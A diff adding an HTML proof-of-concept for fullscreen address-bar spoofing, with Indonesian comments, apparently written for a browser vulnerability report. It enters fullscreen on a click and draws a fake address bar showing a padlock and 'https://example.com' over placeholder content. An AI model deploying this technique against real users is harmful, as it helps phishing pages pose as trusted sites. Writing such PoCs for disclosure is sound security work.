@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fullscreen Spoofing PoC</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            overflow: hidden; /* Mencegah scroll */
+        }
+
+        /* Tombol untuk memicu fullscreen */
+        #trigger-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        #trigger-btn {
+            padding: 15px 30px;
+            font-size: 18px;
+            cursor: pointer;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+        }
+
+        /* UI Palsu yang akan ditampilkan setelah fullscreen */
+        #fake-browser-ui {
+            display: none; /* Sembunyikan awalnya */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #fff;
+            z-index: 9999;
+            flex-direction: column;
+        }
+
+        /* Address bar palsu */
+        .fake-address-bar {
+            background-color: #f1f3f4;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #ddd;
+            font-size: 14px;
+            color: #202124;
+            height: 24px;
+        }
+        .fake-address-bar .lock {
+            margin-right: 8px;
+            color: #5f6368;
+            font-size: 16px;
+        }
+        .fake-address-bar .url {
+            background-color: #fff;
+            border-radius: 15px;
+            padding: 4px 15px;
+            flex-grow: 1;
+            border: 1px solid #ddd;
+            font-family: monospace;
+            font-size: 14px;
+        }
+
+        /* Konten halaman di bawah address bar palsu */
+        .fake-content {
+            flex-grow: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            color: #333;
+            background-color: #f9f9f9;
+        }
+
+        /* Sembunyikan tombol asli saat mode spoofing aktif */
+        body.spoofed #trigger-container {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Tampilan Awal -->
+    <div id="trigger-container">
+        <button id="trigger-btn">Press the button</button>
+    </div>
+
+    <!-- Tampilan Palsu (Fake Address Bar + Content) -->
+    <div id="fake-browser-ui">
+        <div class="fake-address-bar">
+            <span class="lock">🔒</span>
+            <div class="url">https://example.com</div>
+        </div>
+        <div class="fake-content">
+            Halaman ini seolah-olah aman.
+        </div>
+    </div>
+
+    <script>
+        const triggerBtn = document.getElementById('trigger-btn');
+        const fakeBrowserUI = document.getElementById('fake-browser-ui');
+
+        triggerBtn.addEventListener('click', () => {
+            // 1. Meminta browser masuk ke mode Fullscreen
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().then(() => {
+                    // 2. Jika berhasil, ganti UI dengan Address Bar Palsu
+                    document.body.classList.add('spoofed');
+                    fakeBrowserUI.style.display = 'flex';
+                    
+                    // Catatan: Di browser yang rentan (seperti Dia Browser di laporan Anda),
+                    // notifikasi fullscreen tidak akan muncul, sehingga pengguna
+                    // tidak sadar bahwa address bar asli telah disembunyikan.
+                }).catch((err) => {
+                    console.error("Gagal masuk fullscreen:", err);
+                    alert("Browser Anda memblokir fullscreen atau meminta izin.");
+                });
+            }
+        });
+    </script>
+</body>
+</html>
